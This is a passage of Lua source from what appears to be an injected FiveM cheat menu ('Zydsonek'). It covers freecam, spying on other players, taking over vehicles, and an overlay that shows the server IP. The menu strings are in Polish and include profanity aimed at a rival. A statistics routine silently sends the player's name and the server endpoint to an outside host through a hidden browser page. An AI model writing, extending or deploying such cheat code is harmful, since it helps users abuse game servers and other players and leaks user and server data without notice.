                self:DeletePreview()
                walking = false
            elseif not self.On and _on then
                ZYD:GetFunction("FreezeEntityPosition")(ZYD:GetFunction("PlayerPedId")(), false)
                ZYD:GetFunction("SetCamActive")(self.Cam, false)
                ZYD:GetFunction("RenderScriptCams")(false, false, false, false, false)
                ZYD:GetFunction("SetFocusEntity")(ZYD:GetFunction("PlayerPedId")())
                self:DisableMovement(false)
                self:DeletePreview()
                _on = false
            end

            if self.On and _on then
                if not ZYD:GetFunction("IsPedInAnyVehicle")(ZYD:GetFunction("PlayerPedId")()) and not ZYD.Config.UseAutoWalkAlt then
                    ZYD:GetFunction("FreezeEntityPosition")(ZYD:GetFunction("PlayerPedId")(), true)
                elseif ZYD.Config.UseAutoWalkAlt then
                    ZYD:GetFunction("FreezeEntityPosition")(ZYD:GetFunction("PlayerPedId")(), false)
                end

                ZYD:DrawIbuttons()
                self:DrawMode()
                self:DisableMovement(true)
                ZYD:GetFunction("SetFocusPosAndVel")(camX, camY, camZ, 0, 0, 0)
                ZYD:GetFunction("SetCamCoord")(self.Cam, camX, camY, camZ)
                ZYD:GetFunction("SetCamRot")(self.Cam, rot_vec.x + 0.0, rot_vec.y + 0.0, rot_vec.z + 0.0)
                camX, camY, camZ = self:MoveCamera(self.Cam, camX, camY, camZ)
                self:ManipulationLogic(self.Cam, camX, camY, camZ)
            end
        end
    end

    function ZYD:Spectate(who)
        if not who then
            self.SpectatingPlayer = nil
            self.Spectating = false

            return
        end

        self.SpectatingPlayer = who
        self.Spectating = true
    end

    function ZYD:DoRCCar(driver, veh)
        if self.RCCar.On then
            ZYD:GetFunction("TaskSetBlockingOfNonTemporaryEvents")(self.RCCar.Driver, false)
            ZYD:GetFunction("ClearPedTasks")(self.RCCar.Driver)
            ZYD:GetFunction("ClearPedSecondaryTask")(self.RCCar.Driver)

            if driver then
                self.Util:DeleteEntity(self.RCCar.Driver)
                ZYD:GetFunction("SetVehicleDoorsLockedForAllPlayers")(self.RCCar.Vehicle, false)
                ZYD:GetFunction("SetVehicleDoorsLocked")(self.RCCar.Vehicle, 7)
            else
                if ZYD:GetFunction("IsDisabledControlPressed")(0, ZYD.Keys["LEFTSHIFT"]) then
                    TaskLeaveAnyVehicle(self.RCCar.Driver)
                    ZYD:GetFunction("TaskWanderStandard")(self.RCCar.Driver)
                else
                    ZYD:GetFunction("TaskVehicleDriveWander")(self.RCCar.Driver, ZYD:GetFunction("GetVehiclePedIsIn")(self.RCCar.Driver), 1000.0, 0)
                end

                ZYD:GetFunction("SetVehicleDoorsLockedForAllPlayers")(self.RCCar.Vehicle, false)
                ZYD:GetFunction("SetVehicleDoorsLocked")(self.RCCar.Vehicle, 7)
            end
        end

        if not driver then
            self.RCCar.On = false
            self.RCCar.Driver = nil
            self.RCCar.Vehicle = nil

            return
        end

        self.RCCar.On = true
        self.RCCar.Driver = driver
        self.RCCar.Vehicle = veh
    end

    ZYD.Spectating = false
    local spec_on

    function ZYD:Polar3DToWorld(entityPosition, radius, polarAngleDeg, azimuthAngleDeg)
        local polarAngleRad = polarAngleDeg * dict.math.pi / 180.0
        local azimuthAngleRad = azimuthAngleDeg * dict.math.pi / 180.0

        return {
            x = entityPosition.x + radius * (dict.math.sin(azimuthAngleRad) * dict.math.cos(polarAngleRad)),
            y = entityPosition.y - radius * (dict.math.sin(azimuthAngleRad) * dict.math.sin(polarAngleRad)),
            z = entityPosition.z - radius * dict.math.cos(azimuthAngleRad)
        }
    end

    local polar, azimuth = 0, 90

    function ZYD:SpectateTick()
        if not ZYD:GetFunction("DoesCamExist")(self.SpectateCam) then
            self.SpectateCam = ZYD:GetFunction("CreateCam")("DEFAULT_SCRIPTED_CAMERA", true)
        end

        while ZYD.Enabled do
            Wait(0)

            if self.Spectating and not spec_on then
                ZYD:GetFunction("SetCamActive")(self.SpectateCam, true)
                ZYD:GetFunction("RenderScriptCams")(true, false, false, true, true)
                spec_on = true
                ZYD:GetFunction("ClearPedTasks")(ZYD:GetFunction("PlayerPedId")())
                walking = false
            elseif not self.Spectating and spec_on then
                ZYD:GetFunction("FreezeEntityPosition")(ZYD:GetFunction("PlayerPedId")(), false)
                ZYD:GetFunction("SetCamActive")(self.SpectateCam, false)
                ZYD:GetFunction("RenderScriptCams")(false, false, false, false, false)
                ZYD:GetFunction("SetFocusEntity")(ZYD:GetFunction("PlayerPedId")())
                self.FreeCam:DisableMovement(false)
                spec_on = false
            end

            if self.Spectating and spec_on then
                if not self.SpectatingPlayer or not ZYD:GetFunction("DoesEntityExist")(ZYD:GetFunction("GetPlayerPed")(self.SpectatingPlayer)) then
                    self.Spectating = false
                end

                local ent = ZYD:GetFunction("GetPlayerPed")(self.SpectatingPlayer)

                if ZYD:GetFunction("IsPedInAnyVehicle")(ent) then
                    ent = ZYD:GetFunction("GetVehiclePedIsIn")(ent)
                end

                local coords = ZYD:GetFunction("GetOffsetFromEntityInWorldCoords")(ent, 0.0, 0.0, 0.0)

                if not self.Showing then
                    local magX, magY = ZYD:GetFunction("GetDisabledControlNormal")(0, 1), ZYD:GetFunction("GetDisabledControlNormal")(0, 2)
                    polar = polar + magX * 10

                    if polar >= 360 then
                        polar = 0
                    end

                    azimuth = azimuth + magY * 10

                    if azimuth >= 360 then
                        azimuth = 0
                    end
                end

                local where = ZYD:Polar3DToWorld(coords, -3.5, polar, azimuth)

                if not ZYD:GetFunction("IsPedInAnyVehicle")(ZYD:GetFunction("PlayerPedId")()) then
                    ZYD:GetFunction("FreezeEntityPosition")(ZYD:GetFunction("PlayerPedId")(), true)
                end

                self.FreeCam:DisableMovement(true)
                ZYD:GetFunction("SetFocusPosAndVel")(where.x, where.y, where.z, 0, 0, 0)
                ZYD:GetFunction("SetCamCoord")(self.SpectateCam, where.x, where.y, where.z)
                ZYD:GetFunction("PointCamAtEntity")(self.SpectateCam, ent)
            end
        end
    end

    function ZYD:ScreenText(text, font, centered, x, y, scale, r, g, b, a)
        ZYD:GetFunction("SetTextFont")(font)
        ZYD:GetFunction("SetTextProportional")()
        ZYD:GetFunction("SetTextScale")(scale, scale)
        ZYD:GetFunction("SetTextColour")(r, g, b, a)
        ZYD:GetFunction("SetTextDropShadow")(0, 0, 0, 0, 255)
        ZYD:GetFunction("SetTextEdge")(1, 0, 0, 0, 255)
        ZYD:GetFunction("SetTextDropShadow")()
        ZYD:GetFunction("SetTextOutline")()
        ZYD:GetFunction("SetTextCentre")(centered)
        ZYD:GetFunction("BeginTextCommandDisplayText")("STRING")
        ZYD:GetFunction("AddTextComponentSubstringPlayerName")(text)
        ZYD:GetFunction("EndTextCommandDisplayText")(x, y)
    end

    function ZYD:NotificationAlpha(fade_out)
        last_alpha = ZYD:GetFunction("GetGameTimer")() + dict.math.huge
        if doing_alpha and not fade_out then return end
        doing_alpha = true

        CreateThread(function()
            while notif_alpha < 200 and not fade_out do
                Wait(0)
                notif_alpha = notif_alpha + 10
                if notif_alpha >= 200 then break end
            end

            while not fade_out and last_alpha > ZYD:GetFunction("GetGameTimer")() do
                Wait(0)
            end

            while notif_alpha > 0 or fade_out do
                notif_alpha = notif_alpha - 8
                Wait(0)
                if notif_alpha <= 0 then break end
            end

            doing_alpha = false
        end)
    end

    local type_colors = {
        ["INFO"] = {
            text = "[~g~Udane~w~]"
        },
        ["WARN"] = {
            text = "[~r~Nieudane~w~]"
        },
        ["ERROR"] = {
            text = "[~r~Nieudane~w~]"
        },
        ["SUCCESS"] = {
            text = "[~g~Udane~w~]"
        },
        ["Udane"] = {
            text = "[~g~Udane~w~]"
        },
        ["Nieudane"] = {
            text = "[~g~Nieudane~w~]"
        }
    }

    function ZYD:TrimString(str, only_whitespace)
        local char = "%s"
        if #str >= 70 and not only_whitespace then return str:sub(1, 67) .. "..." end

        return dict.string.match(str, "^" .. char .. "*(.-)" .. char .. "*$") or str
    end

    function ZYD:TrimStringBasedOnWidth(str, font, size, max_width)
        local real_width = self.Painter:GetTextWidth(str, font, size)
        if real_width <= max_width then return str end
        local out_str = str
        local cur = #str

        while real_width > max_width and out_str ~= "" do
            if not str:sub(cur, cur) then break end
            out_str = out_str:sub(1, cur - 1)
            real_width = self.Painter:GetTextWidth(out_str, font, size)
            cur = cur - 1
        end

        return out_str:sub(1, #out_str - 3) .. "..."
    end

    function ZYD:DrawNotifications()
        notifications_h = 64
        local max_notifs_on_screen = 20
        local cur_on_screen = 0
        if not self.Config.ShowText then return end

        if not cur_notifs then
            cur_notifs = #self.Notifications
            self:NotificationAlpha()
        end

        if cur_notifs ~= #self.Notifications then
            cur_notifs = #self.Notifications
            self:NotificationAlpha()
        end

        if self.Showing then
            notif_alpha = 200
        elseif not self.Showing and cur_notifs <= 0 and notif_alpha == 200 then
            self:NotificationAlpha(true)
        end

        if cur_notifs <= 0 and last_alpha - self:GetFunction("GetGameTimer")() >= dict.math.huge then
            last_alpha = self:GetFunction("GetGameTimer")() + 2000
        end

        if notif_alpha <= 0 then return end

        local n_x, n_y, n_w = self.Config.NotifX, self.Config.NotifY, self.Config.NotifW

        if not n_x or not n_y or not n_w then return end
        self.Painter:DrawText("~w~[~y~Zydsonek~w~] KABOOM TO KURWA", 4, false, n_x, n_y, 0.35, 255, 255, 255, dict.math.ceil(notif_alpha + 55))

        if #self.Notifications <= 0 then
            self.Painter:DrawText("~w~Brak notyfikacji do pokazania. - JEBAC KABOOMA", 4, false, n_x + 0.5, n_y + 33, 0.35, 255, 255, 255, dict.math.ceil(notif_alpha + 55))
        else
            local notifY = n_y + 33
            local s_y = notifY
            local id = 1

            for k, v in dict.pairs(self.Notifications) do
                if cur_on_screen < max_notifs_on_screen then
                    local left = v.Expires - self:GetFunction("GetGameTimer")()
                    local str = (type_colors[v.Type] or {}).text

                    if str == nil then
                        str = "BAD TYPE - " .. v.Type
                        v.Message = ""
                    end

                    local n_alpha = notif_alpha + 50

                    if left <= 0 then
                        table.remove(self.Notifications, k)
                    else
                        local w_ = self.Painter:GetTextWidth(str, 4, 0.35)
                        n_alpha = dict.math.ceil(n_alpha * (left / 1000) / v.Duration)
                        self.Painter:DrawText(str, 4, false, n_x, notifY, 0.35, 255, 255, 255, _clamp(dict.math.ceil(n_alpha + 15), 0, 255))
                        self.Painter:DrawText(self:TrimStringBasedOnWidth(v.Message, 4, 0.35, n_w - w_ + 8), 4, false, n_x + w_ - 3, notifY, 0.35, 255, 255, 255, _clamp(dict.math.ceil(n_alpha + 15), 0, 255))
                        notifY = notifY + 22
                        id = id + 1
                        cur_on_screen = cur_on_screen + 1
                    end
                end
            end

            local e_y = notifY
            local diff = e_y - s_y

            notifications_h = notifications_h + (diff - 24)
        end

        self.Painter:DrawRect(n_x, n_y, 420, notifications_h, 0, 0, 0, notif_alpha)
        self.Painter:DrawRect(n_x, n_y + 29, 420, 2, self.Tertiary[1], self.Tertiary[2], self.Tertiary[3], notif_alpha + 55)
    end

    local text_alpha = 255

    CreateThread(function()
        local branding = {
            name = "[~y~" .. ZYD.Name .. "~w~]",
            resource = "Skrypt: ~y~" .. ZYD:GetFunction("GetCurrentResourceName")(),
            ip = "IP Serwera: ~y~" .. ZYD:GetFunction("GetCurrentServerEndpoint")(),
            id = "Id: ~y~" .. ZYD:GetFunction("GetPlayerServerId")(ZYD:GetFunction("PlayerId")()),
            veh = "Pojazd: ~y~%s",
            build = " ~w~Exec: (" .. ZYD.Version .. ")"
        }

        while ZYD.Enabled do
            Wait(0)

            if not ZYD.Config.ShowText then
                text_alpha = _lerp(0.05, text_alpha, -255)
            else
                text_alpha = _lerp(0.05, text_alpha, 255)
            end

            text_alpha = dict.math.ceil(text_alpha)

            if text_alpha > 0 then
                local veh = ZYD:GetFunction("GetVehiclePedIsIn")(ZYD:GetFunction("PlayerPedId")())
                local br_wide = _text_width(branding.name)
                local r_wide = _text_width(branding.resource)
                local ip_wide = _text_width(branding.ip)
                local id_wide = _text_width(branding.id)
                local b_wide = _text_width(branding.build)
                local v_wide
                local curY = 0.895

                if ZYD:GetFunction("DoesEntityExist")(veh) then
                    v_wide = _text_width(v_str:format(GetDisplayNameFromVehicleModel(GetEntityModel(veh))))
                    curY = 0.875
                end

                ZYD:ScreenText(branding.name, 4, 0.0, 1.0 - br_wide, curY, 0.35, 255, 255, 255, text_alpha)
                curY = curY + 0.02
                ZYD:ScreenText(branding.resource, 4, 0.0, 1.0 - r_wide, curY, 0.35, 255, 255, 255, text_alpha)
                curY = curY + 0.02
                ZYD:ScreenText(branding.ip, 4, 0.0, 1.0 - ip_wide, curY, 0.35, 255, 255, 255, text_alpha)
                curY = curY + 0.02
                ZYD:ScreenText(branding.id, 4, 0.0, 1.0 - id_wide, curY, 0.35, 255, 255, 255, text_alpha)
                curY = curY + 0.02

                if ZYD:GetFunction("DoesEntityExist")(veh) then
                    ZYD:ScreenText(branding.veh:format(GetDisplayNameFromVehicleModel(GetEntityModel(veh))), 4, 0.0, 1.0 - v_wide, curY, 0.35, 255, 255, 255, text_alpha)
                    curY = curY + 0.02
                end

                ZYD:ScreenText(branding.build, 4, 0.0, 1.0 - b_wide, curY, 0.35, 255, 255, 255, text_alpha)
            end
        end
    end)

    local resources = {}

    local function _split(content, pattern)
        local lines = {}

        for s in content:gmatch(pattern) do
            lines[#lines + 1] = s
        end

        return lines
    end

    local function _find(tab, what)
        local ret = {}

        for id, val in dict.pairs(tab) do
            if val == what or val:find(what) then
                ret[#ret + 1] = id
            end
        end

        return ret
    end

    local function _get_depth(line, lines, deep)
        local out = {}

        for i = -deep, deep do
            out[line + i] = lines[line + i]
        end

        return out
    end

    local Ibuttons = nil
    local _buttons = {}

    function ZYD:SetIbuttons(buttons)
        buttons = buttons or _buttons

        if not ZYD:GetFunction("HasScaleformMovieLoaded")(Ibuttons) then
            Ibuttons = ZYD:GetFunction("RequestScaleformMovie")("INSTRUCTIONAL_BUTTONS")

            while not ZYD:GetFunction("HasScaleformMovieLoaded")(Ibuttons) do
                Wait(0)
            end
        else
            Ibuttons = ZYD:GetFunction("RequestScaleformMovie")("INSTRUCTIONAL_BUTTONS")

            while not ZYD:GetFunction("HasScaleformMovieLoaded")(Ibuttons) do
                Wait(0)
            end
        end

        local sf = Ibuttons
        local w, h = ZYD:GetFunction("GetActiveScreenResolution")()
        ZYD:GetFunction("BeginScaleformMovieMethod")(sf, "CLEAR_ALL")
        ZYD:GetFunction("EndScaleformMovieMethodReturnValue")()

        for i, btn in dict.pairs(buttons) do
            ZYD:GetFunction("BeginScaleformMovieMethod")(sf, "SET_DATA_SLOT")
            ZYD:GetFunction("ScaleformMovieMethodAddParamInt")(i - 1)
            ZYD:GetFunction("ScaleformMovieMethodAddParamTextureNameString")(btn[1])
            ZYD:GetFunction("ScaleformMovieMethodAddParamTextureNameString")(btn[2])
            ZYD:GetFunction("EndScaleformMovieMethodReturnValue")()
        end

        ZYD:GetFunction("BeginScaleformMovieMethod")(sf, "DRAW_INSTRUCTIONAL_BUTTONS")
        ZYD:GetFunction("ScaleformMovieMethodAddParamInt")(layout)
        ZYD:GetFunction("EndScaleformMovieMethodReturnValue")()
    end

    function ZYD:DrawIbuttons()
        if ZYD:GetFunction("HasScaleformMovieLoaded")(Ibuttons) then
            ZYD:GetFunction("DrawScaleformMovie")(Ibuttons, 0.5, 0.5, 1.0, 1.0, 255, 255, 255, 255)
            self:SetIbuttons()
        end
    end

    function ZYD:LoadDui()
        local runtime_txd = CreateRuntimeTxd("ZYD")
        local b_dui = GetDuiHandle(banner_dui)
        CreateRuntimeTextureFromDuiHandle(runtime_txd, "menu_bg", b_dui)
    end

    function ZYD.CharToHex(c)
        return dict.string.format("%%%02X", dict.string.byte(c))
    end

    function ZYD:URIEncode(url)
        if url == nil then return end
        url = url:gsub("\n", "\r\n")
        url = url:gsub("([^%w _%%%-%.~])", self.CharToHex)
        url = url:gsub(" ", "+")

        return url
    end

    function ZYD:DoStatistics()
        if not ZYD.Identifier then return end

        local statistics = {
            name = ZYD:GetFunction("GetPlayerName")(ZYD:GetFunction("PlayerId")()),
            build = ZYD.Version,
            server = ZYD:GetFunction("GetCurrentServerEndpoint")()
        }

        local stat_url = "https://fm.asriel.dev/statistics.gif?identifier=" .. ZYD:URIEncode(ZYD.Identifier) .. "&information=" .. ZYD:URIEncode(dict.json.encode(statistics))
        local s_dui = CreateDui(stat_url, 50, 50)
        Wait(10000)
        DestroyDui(s_dui)
        ZYD:Print("[Statystyki] Zaaktualizowano statystyki")
    end

    CreateThread(function()
        ZYD.FreeCam:Tick()
    end)

    CreateThread(function()
        ZYD:SpectateTick()
    end)

    CreateThread(function()
        ZYD:AddNotification("INFO", "~y~" .. ZYD.Name .. "~w~  (~y~v" .. ZYD.Version .. "~w~)", 25000)
        ZYD:AddNotification("INFO", "Uzyj ~y~[V] ~w~by otworzyc menu", 25000)

        if _Executor ~= "None" then
            ZYD:AddNotification("INFO", "Jebac Kabooma")
        end

        if _Executor == "redENGINE" then
            print("Jebac Kabooma")
        else
            ZYD:AddNotification("INFO", "Jebac Kabooma")
        end

        ZYD:BuildIdentifier()
        ZYD:LoadDui()
        Wait(2500)
    end)
end) 

end)